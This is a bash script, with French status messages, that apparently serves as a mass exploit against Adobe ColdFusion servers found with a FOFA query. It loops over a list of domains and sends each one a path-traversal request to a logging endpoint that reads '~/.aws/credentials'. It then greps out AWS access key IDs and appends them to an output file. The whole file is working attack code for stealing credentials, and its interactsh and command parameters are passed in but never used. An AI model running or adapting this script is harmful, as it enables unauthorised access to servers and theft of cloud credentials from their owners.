#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <domains_file> <interactsh_url> <output_file>"
    exit 1
fi

# FOFA Query: app="Adobe-ColdFusion"

domains_file="$1"
interactsh_url="$2"
output_file="$3"
default_command="grep -oP 'AKIA[A-Z0-9]{16}'"

if [ ! -f "$domains_file" ]; then
    echo "Le fichier de domaines '$domains_file' n'existe pas."
    exit 1
fi

exploit() {
    local target_url="$1"
    local interactsh_url="$2"
    local command="$3"
    local output_file="$4"

    request_url="${target_url}/pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000"

    response=$(curl -s "$request_url")

    if [ $? -eq 0 ]; then
        akia_keys=$(echo "$response" | grep -oP 'AKIA[A-Z0-9]{16}')

        if [ -n "$akia_keys" ]; then
            echo "Clés AKIA trouvées dans le contenu de $target_url"
            echo "Clés AKIA trouvées dans $target_url:" >> "$output_file"
            echo "$akia_keys" >> "$output_file"
        else
            echo "Aucune clé AKIA trouvée dans le contenu de $target_url"
        fi
    else
        echo "Échec de la requête sur $target_url"
    fi
}

test_exploit_on_domains() {
    local domains_file="$1"
    local interactsh_url="$2"
    local output_file="$3"

    while IFS= read -r domain || [ -n "$domain" ]; do
        domain=$(echo "$domain" | tr -d '\r\n')
        exploit "$domain" "$interactsh_url" "$default_command" "$output_file"
    done < "$domains_file"
}

test_exploit_on_domains "$domains_file" "$interactsh_url" "$output_file"
